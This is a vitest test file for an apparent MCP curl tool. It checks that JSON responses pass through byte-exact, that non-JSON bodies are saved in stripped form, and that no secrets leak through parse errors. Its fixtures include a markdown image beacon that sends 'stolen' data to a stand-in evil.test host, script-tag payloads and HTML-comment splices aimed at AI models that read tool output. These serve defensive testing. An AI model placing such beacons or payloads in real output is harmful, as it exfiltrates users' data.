// src/lib/tools/curl-execute.json-passthrough.test.ts
// `docs/todos/018`'s acceptance criteria, at the outermost boundary a real input
// reaches.
//
// **At `executeCurlRequest` rather than beside `defendForInline`**, because
// every one of these is a property of the COMPOSITION and a direct assertion on
// the defence cannot see it. Measured on this branch: `defendForInline` returned
// a JSON body byte-exact while the shipped path still rewrote it, because
// `formatResponse` prefixed the header block and the wrap's undivided scan ran
// over the join. A unit test on the defence passed throughout.
// `skill: pr-resolver-safety` -> *Where the regression test goes*.

import { describe, it, expect, vi, beforeEach, afterAll } from "vitest";
import { readFile, rm } from "fs/promises";
import { CurlExecuteSchema } from "../server/schemas.js";
import {
    METADATA_SEPARATOR as SEP,
    curlOutputFor,
    savedPathFrom as sharedSavedPathFrom,
} from "./curl-output.test-fixture.js";

vi.mock("../types/index.js", async () => {
    const actual = await vi.importActual<typeof import("../types/index.js")>("../types/index.js");
    return { ...actual, generateMetadataSeparator: () => SEP };
});

vi.mock("../security/index.js", async () => {
    const actual =
        await vi.importActual<typeof import("../security/index.js")>("../security/index.js");
    return {
        ...actual,
        validateUrlAndResolveDns: vi.fn().mockResolvedValue({
            // Literals, not imported bindings: this factory hoists above every
            // import, so a binding is not initialised yet (RC-35).
            hostname: "example.test",
            resolvedIp: "93.184.216.34",
            port: 443,
        }),
        checkRateLimits: vi.fn(),
    };
});

vi.mock("../execution/index.js", async () => {
    const actual =
        await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
    // **`platformSupportsHeaderDump` is pinned, and without it this suite was
    // green only on darwin.** `curl-execute.ts` takes the `headersUnsupported`
    // branch on any other host, so `responseHeaders` is undefined, only one
    // content entry is emitted, and the two-region cases below fail on a Linux
    // runner. Both sibling suites pin it and both say why; this one adopted
    // neither and the omission was invisible because the shared fixture supplies
    // `headerBytes` unconditionally.
    //
    // Worth stating plainly: the assertions it silently skipped are the ones
    // that would have caught the notice-prefix splice (`LESSONS.md` RC-41).
    return { ...actual, executeCommand: vi.fn(), platformSupportsHeaderDump: () => true };
});

const executionModule = await import("../execution/index.js");
const { executeCurlRequest } = await import("./curl-execute.js");
// `vi.mocked`, not `as Mock` — the bare type erases the signature and leaves
// every fixture in this file unchecked against `CommandResult` (RC-35).
const mockedExecuteCommand = vi.mocked(executionModule.executeCommand);

const params = (p: Record<string, unknown>) => CurlExecuteSchema.parse(p);

const written: string[] = [];
const savedPathFrom = (text: string): string => {
    const path = sharedSavedPathFrom(text);
    written.push(path);
    return path;
};

beforeEach(() => vi.clearAllMocks());
afterAll(async () => {
    await Promise.all(written.map((f) => rm(f, { force: true })));
});

/** The body as the model actually receives it: entry 0, after the wrap's shape. */
const bodyOf = (result: { content: Array<{ text: string }> }) => result.content[0]!.text;

async function fetchBody(
    body: string,
    contentType: string,
    extra: Record<string, unknown> = {}
): Promise<string> {
    mockedExecuteCommand.mockResolvedValue(curlOutputFor({ body, contentType }));
    const result = await executeCurlRequest(
        params({ url: "https://example.test/x", ...extra })
    );
    return bodyOf(result);
}

// ---------------------------------------------------------------------------
// AC 1 — a JSON body is returned byte-identical to what the origin sent.
//
// Every case here is a documented loss of the round trip this todo removed, and
// each has its own RC. They are asserted as one list because the property is
// one property: no re-serialisation happened.
// ---------------------------------------------------------------------------
describe("018 AC1 — a JSON body survives byte for byte", () => {
    const cases: Array<[string, string]> = [
        // RC-31: `JSON.parse` keeps the LAST duplicate name. Unfixable while the
        // body is re-serialised, and the P1 of this todo: a tool contracted to
        // return an API's data returned different data.
        ["duplicate name", '{"total":5,"total":9}'],
        // RC-24, RC-27, RC-29: needed `keepNumberLexeme` to survive at all.
        ["integer past MAX_SAFE_INTEGER", '{"id":9223372036854775807}'],
        ["overflowing exponent", '{"n":1e400}'],
        ["trailing-zero decimal", '{"price":"1.50"}'],
        // Key order was declined as harmless while it still happened; now it
        // cannot happen, so it is pinned.
        ["key order", '{"z":1,"m":2,"a":3}'],
        ["non-ASCII keys", '{"ключ":"значение","日本":"語"}'],
        // **Escaped, because that is the only form that reaches a parser.** An
        // unescaped lone surrogate in this source becomes U+FFFD the moment the
        // fixture encodes it to a Buffer, so the first draft of this case tested
        // the encoder rather than the defence. `JSON.parse` tolerates the escape
        // and `JSON.stringify` re-emits it, which is where the bytes used to move.
        ["escaped lone surrogate", '{"s":"\\ud800"}'],
        // Markup inside a value is legitimate string content in an API payload,
        // and rewriting it was what the strip stages did on this path.
        ["markup inside values", '{"a":"<script>x</script>","b":"<!-- c -->"}'],
        ["nested composite", '{"a":{"b":[1,{"c":"<!--"}]},"d":"-->"}'],
    ];

    // **Both content types, and `text/html` is the one with teeth.**
    // `application/json` is exempt from the strip stages, so `defendText` is a
    // no-op on it and these cases would pass even if the body were re-defended
    // — measured by probe, which failed nothing until this loop was widened.
    // Under `text/html` every stage would run, so any defence pass on the body
    // shows up as moved bytes. Same false green as `LESSONS.md` RC-33's.
    for (const [name, body] of cases) {
        for (const contentType of ["application/json", "text/html"]) {
            it(`returns ${name} unchanged (${contentType})`, async () => {
                expect(await fetchBody(body, contentType)).toBe(body);
            });
        }
    }
});

// ---------------------------------------------------------------------------
// AC 2 — the declared content type selects nothing.
//
// This is invariant 1a's named failure shape closed by construction rather than
// guarded: the header is reported, never consulted. Guarding it produced a P1 in
// each of five review rounds on PR #37.
// ---------------------------------------------------------------------------
describe("018 AC2 — the declared content type selects nothing", () => {
    // Deliberately markup-shaped AND markdown-shaped, so every strip stage has
    // something to remove if any of them still runs.
    const body = '{"note":"<script>a</script> see ![x](https://evil.test/p.gif) <!-- c -->"}';

    for (const contentType of [
        "application/json",
        "text/html",
        "text/markdown",
        "image/png",
        "application/octet-stream",
        "text/plain",
        // Malformed: `MEDIA_TYPE_HEAD` rejects it, so it arrives as `undefined`
        // with `contentTypeUndetermined` still false — the asymmetry RC-31 is
        // about, and the arm that used to take the strictest grammar.
        "text/markdown;;",
        // The origin sent none at all.
        "",
    ]) {
        it(`returns the same bytes under ${contentType === "" ? "no content type" : contentType}`, async () => {
            expect(await fetchBody(body, contentType)).toBe(body);
        });
    }
});

// ---------------------------------------------------------------------------
// AC 3, AC 4, AC 5 — the non-JSON arm.
// ---------------------------------------------------------------------------
describe("018 AC3/AC4/AC5 — a non-JSON body is reported, not inlined", () => {
    // AC 4 is the one worth stating twice: V8's parse message embeds up to ten
    // bytes of the body, and the WHOLE body when the body is short. So the
    // secret below is a probe for a real leak channel, not decoration.
    const SECRET = "SUPERSECRET_CANARY_9f3a";

    it("returns no inline body bytes for an HTML error page (AC3), and names the shape (AC4)", async () => {
        const text = await fetchBody(`<html><body>${SECRET}</body></html>`, "text/html");
        expect(text).not.toContain(SECRET);
        expect(text).toContain("looks-like-markup");
        expect(text).toContain("not a JSON object or array");
        savedPathFrom(text);
    });

    it("leaks no body bytes through V8's message on a short unparseable body (AC4)", async () => {
        // Measured shape: `JSON.parse('{"a": SUPERSECRET}')` reports
        // `Unexpected token 'S', "{"a": SUPERSECRET}" is not valid JSON` — the
        // entire body, because the body is short.
        const text = await fetchBody(`{"a": ${SECRET}}`, "application/json");
        expect(text).not.toContain(SECRET);
        expect(text).toContain("invalid-syntax");
        savedPathFrom(text);
    });

    it("leaks no body bytes on a truncated body either (AC4)", async () => {
        const text = await fetchBody(`{"a":"${SECRET}`, "application/json");
        expect(text).not.toContain(SECRET);
        savedPathFrom(text);
    });

    for (const [name, body] of [
        ["null", "null"],
        ["a number", "42"],
        ["a quoted string", '"x"'],
        // The dangerous one. `isDefinitelyJson` answers TRUE here, because
        // `JSON_DOCUMENT_FIRST_CHARS` admits `"` — so an artefact gate built on
        // that predicate would have persisted raw origin octets for a body whose
        // only reader is the host's own file tooling.
        ["a quoted script tag", '"<script>x</script>"'],
    ] as Array<[string, string]>) {
        it(`treats ${name} as non-JSON (AC5)`, async () => {
            const text = await fetchBody(body, "application/json");
            expect(text).toContain("bare-scalar");
            savedPathFrom(text);
        });
    }

    it("actually STRIPS a bare-scalar body's markup before persisting it", async () => {
        // **This is the case the AC5 loop above could not see, and the gap was
        // real.** Those cases assert the *report* names `bare-scalar`; none of
        // them reads the file. A bare-scalar JSON body took
        // `defendText(…, { contentTypeUndetermined: true })` and no strip stage
        // ran, because `defendText` re-asked the JSON question with the looser
        // `isDefinitelyJson` — for which `'"<script>x</script>"'` is TRUE — and
        // that cancelled the strictest grammar the call had requested.
        //
        // Meanwhile `savedMessage` told the model those bytes "have been through
        // the full defence pipeline". So the artefact is what has to be asserted,
        // not the sentence describing it.
        for (const [name, body, forbidden] of [
            ["script tag", '"<script>alert(1)</script>"', "<script"],
            ["markdown beacon", '"![x](https://evil.test/?d=stolen)"', "evil.test"],
            ["html comment", '"a <!-- b --> c"', "<!--"],
        ] as Array<[string, string, string]>) {
            const text = await fetchBody(body, "application/json");
            expect(text).toContain("bare-scalar");
            const onDisk = await readFile(savedPathFrom(text), "utf-8");
            expect(onDisk, `${name} survived into the artefact`).not.toContain(forbidden);
        }
    });

    it("reports the byte count and the path, and echoes NO remote token", async () => {
        // **The declared content type is deliberately absent from this
        // sentence.** `docs/todos/018` settles it onto the `include_metadata`
        // JSON field, where the serialiser escapes it; this string is
        // server-authored prose a model reads as ours, so a remote-echoed token
        // inside it is what ARCHITECTURE.md invariant 13 admits only in last
        // position. A first draft interpolated it, and two existing cases in
        // `register-all-tools.test.ts` caught it.
        //
        // **`declared_content_type` is not added by this change**, and nothing
        // regressed: it was never reported on any branch before. It is coupled
        // to `MEDIA_TYPE_HEAD`'s deletion, which is the next slice of 018.
        const body = "<html>nope</html>";
        const text = await fetchBody(body, "text/html");
        expect(text).not.toContain("text/html");
        expect(text).toMatch(/\d+ bytes on disk/);
        expect(text).toContain("read the path with your own tooling");
        savedPathFrom(text);
    });

    it("says plainly that the saved non-JSON bytes are not the origin's exact bytes", async () => {
        // The honest half of the artefact split: this arm is defended text, so a
        // caller must not read it as a faithful copy.
        const text = await fetchBody("<html><!-- x --></html>", "text/html");
        expect(text).toContain("not the origin's exact bytes");
        savedPathFrom(text);
    });
});

// ---------------------------------------------------------------------------
// AC 6 — the artefact gate is the same rule as the body gate, and inherits no
// strip cap.
//
// **Both directions, at a size that reaches the save arm**, which is the whole
// point: `parseJsonDocument` returns `undefined` above `STRIP_PATH_MAX_BYTES`
// (262,144) while the default inline cap is 500,000, so the arm where this
// question exists is the arm where `isDefinitelyJson` always answers "not
// JSON". Both cases below fail against that predicate.
// ---------------------------------------------------------------------------
describe("018 AC6 — the artefact gate is the body gate, with no strip cap", () => {
    // **A zero-width space is what makes these two cases able to fail**, and
    // without it neither could. Above `STRIP_PATH_MAX_BYTES` no strip stage runs
    // at all, so at 600 KB the defended text equals the origin text for any
    // benign body — and an assertion comparing them would pass whichever branch
    // the artefact took. Step 2 removes this codepoint at ANY size, so it is the
    // one discriminator available here.
    //
    // That is the same false green the last round of this work recorded: an
    // `application/json` fixture is exempt from the strip stages, so the
    // defended text equalled the origin bytes and the assertion could not tell
    // them apart. Caught by probing, not by reading. `LESSONS.md` RC-33.
    const ZWSP = "\u200b";

    it("persists a 600 KB OBJECT body as the origin's exact octets", async () => {
        const filler = "x".repeat(600_000);
        const body = `{"pad":"${filler}","note":"a${ZWSP}b","dup":1,"dup":2,"big":9223372036854775807}`;
        const text = await fetchBody(body, "application/json");
        const onDisk = await readFile(savedPathFrom(text));
        // Byte for byte, the zero-width space included — the artefact is the
        // origin's octets, and its reader (`jq_query`) applies the full defence
        // when it opens the file. Had this arm written the defended text, the
        // ZWSP would be gone and this comparison would fail.
        expect(onDisk.equals(Buffer.from(body, "utf8"))).toBe(true);
        expect(onDisk.toString("utf8")).toContain(ZWSP);
        // And the losses a round trip would have caused are simply absent.
        expect(onDisk.toString("utf8")).toContain('"dup":1,"dup":2');
        expect(onDisk.toString("utf8")).toContain("9223372036854775807");
    });

    it("persists a non-UTF-8 JSON body as the exact wire octets", async () => {
        // **This is the case that gives the artefact gate teeth**, and the only
        // one that can. On the JSON arm `content` is the decoded body and the
        // artefact is `responseBytes`, so for a valid-UTF-8 body the two arms
        // produce identical bytes and no assertion can separate them — probe
        // measured exactly that: reverting the gate failed nothing.
        //
        // A raw `0xE9` decodes to U+FFFD, so re-encoding the decode gives
        // `EF BF BD` where the origin sent one byte. `docs/todos/016`'s
        // acceptance criterion 1, finally reachable now that 018 has settled
        // who reads the file.
        const wire = Buffer.concat([
            Buffer.from('{"name":"Jos', "utf8"),
            Buffer.from([0xe9]),
            Buffer.from('","pad":"', "utf8"),
            Buffer.from("z".repeat(600_000), "utf8"),
            Buffer.from('"}', "utf8"),
        ]);
        mockedExecuteCommand.mockResolvedValue(
            curlOutputFor({ body: wire, contentType: "application/json" })
        );
        const result = await executeCurlRequest(params({ url: "https://example.test/x" }));
        const onDisk = await readFile(savedPathFrom(bodyOf(result)));
        expect(onDisk.equals(wire)).toBe(true);
        // The specific loss this closes: one octet, not three.
        expect(onDisk.includes(Buffer.from([0xe9]))).toBe(true);
        expect(onDisk.includes(Buffer.from([0xef, 0xbf, 0xbd]))).toBe(false);
    });

    it("takes the non-JSON arm for a 600 KB BARE-STRING body and writes DEFENDED text", async () => {
        const filler = "y".repeat(600_000);
        const body = `"${filler}a${ZWSP}b"`;
        const text = await fetchBody(body, "application/json");
        // `isDefinitelyJson` says TRUE for this body — `JSON_DOCUMENT_FIRST_CHARS`
        // admits `"` — which is why the artefact gate must not be built on it.
        expect(text).toContain("bare-scalar");
        const onDisk = await readFile(savedPathFrom(text));
        expect(onDisk.equals(Buffer.from(body, "utf8"))).toBe(false);
        // The specific difference: Step 2 ran, so this is not raw origin octets.
        expect(onDisk.toString("utf8")).not.toContain(ZWSP);
    });
});

// ---------------------------------------------------------------------------
// Invariant 13 / 16 — the regions stay separate, and the divider survives.
//
// These are the two routes that re-opened RC-16's splice when the per-leaf walk
// was removed, and each is fixed at a different layer.
// ---------------------------------------------------------------------------
describe("018 — two remote regions, two content entries", () => {
    const spliceable = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';

    it("keeps the body byte-exact and puts header text in its own entry", async () => {
        mockedExecuteCommand.mockResolvedValue(
            curlOutputFor({
                body: spliceable,
                contentType: "application/json",
                headerBlock: "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\n\r\n",
            })
        );
        const result = await executeCurlRequest(
            params({
                url: "https://example.test/x",
                include_headers: true,
                include_metadata: false,
            })
        );

        // Body, then header text. No third entry: a clean exit with headers
        // captured produces no notices.
        expect(result.content).toHaveLength(2);
        // The body region: untouched, every field intact. Merged into one entry
        // this returned `{"a":"open ","d":"kept"}` — `b` and `c` deleted, still
        // valid JSON, nothing downstream able to tell.
        expect(result.content[0]!.text).toBe(spliceable);
        expect(Object.keys(JSON.parse(result.content[0]!.text) as object)).toEqual([
            "a",
            "b",
            "c",
            "d",
        ]);
        // The header region: its own entry, and never mixed into the body.
        expect(result.content[1]!.text).toContain("HTTP/1.1 200 OK");
        expect(result.content[0]!.text).not.toContain("HTTP/1.1");
    });

    // -----------------------------------------------------------------------
    // The notice is a THIRD region, and it was the second join in one function.
    // One case per trigger, because each is reached by a different flag and the
    // one that used to be covered was neutralised by a platform mock.
    // `LESSONS.md` RC-41.
    // -----------------------------------------------------------------------
    for (const [trigger, fixture] of [
        ["non-zero cURL exit", { exitCode: 18 }],
        ["headers requested but none arrived", { headerBlock: "", includeHeaders: true }],
    ] as Array<[string, { exitCode?: number; headerBlock?: string; includeHeaders?: boolean }]>) {
        it(`keeps every key when a notice is present (${trigger})`, async () => {
            const base = curlOutputFor({
                body: spliceable,
                contentType: "application/json",
                ...(fixture.headerBlock === undefined ? {} : { headerBlock: fixture.headerBlock }),
            });
            mockedExecuteCommand.mockResolvedValue({
                ...base,
                ...(fixture.exitCode === undefined ? {} : { exitCode: fixture.exitCode }),
            });
            const result = await executeCurlRequest(
                params({
                    url: "https://example.test/x",
                    include_metadata: false,
                    ...(fixture.includeHeaders ? { include_headers: true } : {}),
                })
            );

            // The body entry is still entry 0 and still parses on its own — the
            // notice cannot have been prefixed to it.
            expect(result.content[0]!.text).toBe(spliceable);
            expect(Object.keys(JSON.parse(result.content[0]!.text) as object)).toEqual([
                "a",
                "b",
                "c",
                "d",
            ]);
            // And the notice really was produced, or this case proves nothing.
            const notice = result.content.find((c) => c.text.startsWith("[mcp-curl]"));
            expect(notice, "no notice was produced, so the case is vacuous").toBeDefined();
        });
    }

    it("emits a single entry when no header text was reported", async () => {
        mockedExecuteCommand.mockResolvedValue(
            curlOutputFor({ body: spliceable, contentType: "application/json" })
        );
        const result = await executeCurlRequest(params({ url: "https://example.test/x" }));
        expect(result.content).toHaveLength(1);
    });
});
